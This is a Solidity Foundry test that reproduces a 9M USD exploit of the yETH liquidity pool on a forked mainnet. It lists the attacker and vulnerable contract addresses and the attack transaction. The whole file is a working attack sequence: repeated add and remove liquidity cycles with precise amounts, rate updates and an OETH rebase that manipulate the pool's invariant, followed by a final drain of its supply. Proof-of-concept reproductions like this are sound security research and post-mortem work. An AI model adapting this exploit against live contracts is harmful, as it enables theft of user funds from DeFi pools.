// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : 9M USD
// Attacker : 0xfb63aa935cf0a003335dce9cca03c4f9c0fa4779
// Attack Contract : 0xbb2789b418fa18f9526ba79fa7038d4e6d753f73
// Vulnerable Contract : 0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81
// Attack Tx : 0x53fe7ef190c34d810c50fb66f0fc65a1ceedc10309cf4b4013d64042a0331156
// Analysis : https://github.com/banteg/yeth-exploit/blob/main/report.pdf

// @POC Author
// Original POC: https://github.com/johnnyonline/yETH-hack
// Refactored for readability
// Key changes: Reduced code duplication, improved structure, added comprehensive logging

interface IPool {
    function virtual_balance(
        uint256 index
    ) external view returns (uint256);
    function supply() external view returns (uint256);
    function remove_liquidity(
        uint256 _lp_amount,
        uint256[] calldata _min_amounts,
        address _receiver
    ) external;
    function vb_prod_sum() external view returns (uint256, uint256);
    function assets(
        uint256 index
    ) external view returns (address);
    function add_liquidity(
        uint256[] calldata _amounts,
        uint256 _min_lp_amount,
        address _receiver
    ) external returns (uint256);
    function update_rates(
        uint256[] calldata _assets
    ) external;
}

interface IOETH is IERC20 {
    function rebase() external;
}

contract YETHExploitTest is BaseTestWithBalanceLog {
    uint256 constant FORK_BLOCK = 23_914_085;
    uint256 constant INITIAL_BALANCE = 20_000e18;
    uint256 constant NUM_ASSETS = 8;

    IPool constant POOL = IPool(0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81);
    IERC20 constant YETH = IERC20(0x1BED97CBC3c24A4fb5C069C6E311a967386131f7);
    IOETH constant OETH = IOETH(0x39254033945AA2E4809Cc2977E7087BEE48bd7Ab);

    address attacker;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        fundingToken = address(0);
        attacker = address(69);
    }

    function testExploit() public balanceLog {
        vm.startPrank(attacker);

        _setupInitialBalances();
        _initialRateUpdate();
        _executeExploitSequence();
        //Take back assets from flashloan to get actual profit
        _takeInitialsBack();
        _logFinalBalances();

        vm.stopPrank();
    }

    function _setupInitialBalances() internal {
        for (uint256 i = 0; i < NUM_ASSETS; i++) {
            address asset = POOL.assets(i);
            deal(asset, attacker, INITIAL_BALANCE);
            IERC20(asset).approve(address(POOL), type(uint256).max);
        }
        YETH.approve(address(POOL), type(uint256).max);
    }

    function _takeInitialsBack() internal {
        for (uint256 i = 0; i < NUM_ASSETS; i++) {
            address asset = POOL.assets(i);
            deal(asset, attacker, IERC20(asset).balanceOf(attacker) - INITIAL_BALANCE);
        }
    }

    function _initialRateUpdate() internal {
        uint256[] memory rates = new uint256[](8);
        for (uint256 i = 0; i < 6; i++) {
            rates[i] = i;
        }
        POOL.update_rates(rates);
        _logPoolState("After initial rate update");
    }

    function _executeExploitSequence() internal {
        // Phase 1: Initial manipulation
        _executePhase1();

        // Phase 2: Multiple add/remove cycles
        _executeAddRemoveCycle(1, _getPhase2Amounts(), 2_789_348_310_901_989_968_648);
        _executeAddRemoveCycle(2, _getPhase3Amounts(), 7_379_203_011_929_903_830_039);
        _executeAddRemoveCycle(3, _getPhase4Amounts(), 7_066_638_371_690_257_003_757);
        _executeAddRemoveCycle(4, _getPhase5Amounts(), 3_496_158_478_994_807_127_953);

        // Phase 3: Complex manipulation with rate updates
        _executePhase6();

        // Phase 4: Rebase exploitation
        _executePhase7();

        // Phase 5: Additional manipulation
        _executePhase8();

        // Phase 6: Final drain
        _executeFinalDrain();
    }

    function _executePhase1() internal {
        uint256 removeAmount = 416_373_487_230_773_958_294;
        deal(address(YETH), attacker, removeAmount);
        console.log("Initial yETH balance:", YETH.balanceOf(attacker));
        _removeLiquidity(removeAmount, "After initial remove");
    }

    function _executeAddRemoveCycle(
        uint256 cycleNum,
        uint256[8] memory amounts,
        uint256 removeAmount
    ) internal {
        _addLiquidity(amounts, string.concat("After add cycle ", vm.toString(cycleNum)));
        _removeLiquidity(removeAmount, string.concat("After remove cycle ", vm.toString(cycleNum)));
    }

    function _executePhase6() internal {
        // Fifth add
        _addLiquidity(_getPhase6Add1Amounts(), "After fifth add");

        // Sixth add (small amount to asset 3)
        _addLiquidity(_getSingleAssetAmounts(3, 20_605_468_750_000_000_000), "After sixth add");

        // Empty remove and rate update
        _removeLiquidity(0, "After remove(0)");
        _updateSingleRate(6);

        // Sixth remove
        _removeLiquidity(8_434_932_236_461_542_896_540, "After sixth remove");
    }

    function _executePhase7() internal {
        OETH.rebase();
        _logPoolState("After OETH rebase");

        _addLiquidity(_getPhase7Add1Amounts(), "After post-rebase add 1");
        _addLiquidity(_getPhase7Add2Amounts(), "After post-rebase add 2");
    }

    function _executePhase8() internal {
        // Ninth add
        _addLiquidity(_getSingleAssetAmounts(3, 57_226_562_500_000_000_000), "After asset 3 add 2");

        // Empty remove and rate update
        _removeLiquidity(0, "After remove(0) #2");
        _updateSingleRate(6);

        // Eighth remove
        _removeLiquidity(9_237_030_802_829_017_297_880, "After eighth remove");

        // Tenth and eleventh adds
        _addLiquidity(_getPhase8Add1Amounts(), "After tenth add");
        _addLiquidity(_getPhase8Add2Amounts(), "After eleventh add");

        // Twelfth add
        _addLiquidity(_getSingleAssetAmounts(3, 318_750_000_000_000_000_000), "After asset 3 add 3");

        // Empty remove and rate update
        _removeLiquidity(0, "After remove(0) #3");
        _updateSingleRate(7);
    }

    function _executeFinalDrain() internal {
        uint256 poolSupply = POOL.supply();
        console.log("Pool supply before drain:", poolSupply);

        _removeLiquidity(poolSupply, "After FINAL DRAIN");

        // Final add with minimal amounts
        uint256[8] memory finalAmounts;
        for (uint256 i = 0; i < NUM_ASSETS - 1; i++) {
            finalAmounts[i] = 1;
        }
        finalAmounts[7] = 9;

        _addLiquidity(finalAmounts, "After FINAL ADD");
    }

    // Helper functions
    function _addLiquidity(
        uint256[8] memory amounts,
        string memory label
    ) internal {
        uint256[] memory amountsArray = new uint256[](NUM_ASSETS);
        for (uint256 i = 0; i < NUM_ASSETS; i++) {
            amountsArray[i] = amounts[i];
        }
        uint256 received = POOL.add_liquidity(amountsArray, 0, attacker);
        console.log("Received yETH:", received);
        _logPoolState(label);
    }

    function _removeLiquidity(
        uint256 amount,
        string memory label
    ) internal {
        POOL.remove_liquidity(amount, new uint256[](NUM_ASSETS), attacker);
        _logPoolState(label);
    }

    function _updateSingleRate(
        uint256 assetIndex
    ) internal {
        uint256[] memory rates = new uint256[](1);
        rates[0] = assetIndex;
        POOL.update_rates(rates);
        _logPoolState(string.concat("After rate update (asset ", vm.toString(assetIndex), ")"));
    }

    function _logPoolState(
        string memory label
    ) internal view {
        (uint256 prod, uint256 sum) = POOL.vb_prod_sum();
        console.log("=== %s ===", label);
        console.log("  vb_prod:", prod);
        console.log("  vb_sum:", sum);
    }

    function _logFinalBalances() internal {
        address[] memory assets = new address[](NUM_ASSETS + 2);

        // Get all pool assets
        for (uint256 i = 0; i < NUM_ASSETS; i++) {
            assets[i] = POOL.assets(i);
        }

        // Add YETH and ETH
        assets[NUM_ASSETS] = address(YETH);
        assets[NUM_ASSETS + 1] = address(0); // ETH

        logMultipleTokenBalances(assets, attacker, "Final Balances");
    }

    function _getSingleAssetAmounts(
        uint256 index,
        uint256 amount
    ) internal pure returns (uint256[8] memory amounts) {
        amounts[index] = amount;
    }

    // Amount getter functions
    function _getPhase2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 610_669_608_721_347_951_666;
        amounts[1] = 777_507_145_787_198_969_404;
        amounts[2] = 563_973_440_562_370_010_057;
        amounts[4] = 476_460_390_272_167_461_711;
    }

    function _getPhase3Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_636_245_238_220_874_001_286;
        amounts[1] = 1_531_136_279_659_070_868_194;
        amounts[2] = 1_041_815_511_903_532_551_187;
        amounts[4] = 991_050_908_418_104_947_336;
        amounts[5] = 1_346_008_005_663_580_090_716;
    }

    function _getPhase4Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_630_811_661_792_970_363_090;
        amounts[1] = 1_526_051_744_772_289_698_092;
        amounts[2] = 1_038_108_768_586_660_585_581;
        amounts[4] = 969_651_157_511_131_341_121;
        amounts[5] = 1_363_135_138_655_820_584_263;
    }

    function _getPhase5Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 859_805_263_416_698_094_503;
        amounts[1] = 804_573_178_584_505_833_740;
        amounts[2] = 546_933_182_262_586_953_508;
        amounts[4] = 510_865_922_059_584_325_991;
        amounts[5] = 723_182_384_178_548_055_243;
    }

    function _getPhase6Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_784_169_320_136_805_803_209;
        amounts[1] = 1_669_558_029_141_448_703_194;
        amounts[2] = 1_135_991_585_797_559_066_395;
        amounts[4] = 1_061_079_136_814_511_050_837;
        amounts[5] = 1_488_254_960_317_842_892_500;
    }

    function _getPhase7Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_049_508_928_999_413_985_639;
        amounts[1] = 982_090_679_001_395_746_930;
        amounts[2] = 667_668_088_369_153_429_906;
        amounts[4] = 623_639_019_639_346_230_238;
        amounts[5] = 878_771_594_643_399_886_538;
    }

    function _getPhase7Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 919_888_612_738_016_815_095;
        amounts[1] = 860_796_899_699_397_749_576;
        amounts[2] = 586_033_288_771_470_394_081;
        amounts[4] = 547_387_589_810_030_997_702;
        amounts[5] = 763_397_793_689_173_373_329;
    }

    function _getPhase8Add1Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 417_517_891_458_429_416_749;
        amounts[1] = 390_697_418_752_374_378_114;
        amounts[2] = 264_940_493_241_640_253_533;
        amounts[4] = 247_469_112_791_605_057_921;
        amounts[5] = 355_235_146_731_093_304_055;
    }

    function _getPhase8Add2Amounts() internal pure returns (uint256[8] memory amounts) {
        amounts[0] = 1_779_325_564_746_959_656_328;
        amounts[1] = 1_665_025_426_427_657_662_239;
        amounts[2] = 1_133_554_647_882_989_836_457;
        amounts[4] = 1_058_802_901_663_485_490_031;
        amounts[5] = 1_476_627_921_656_231_103_547;
    }
}
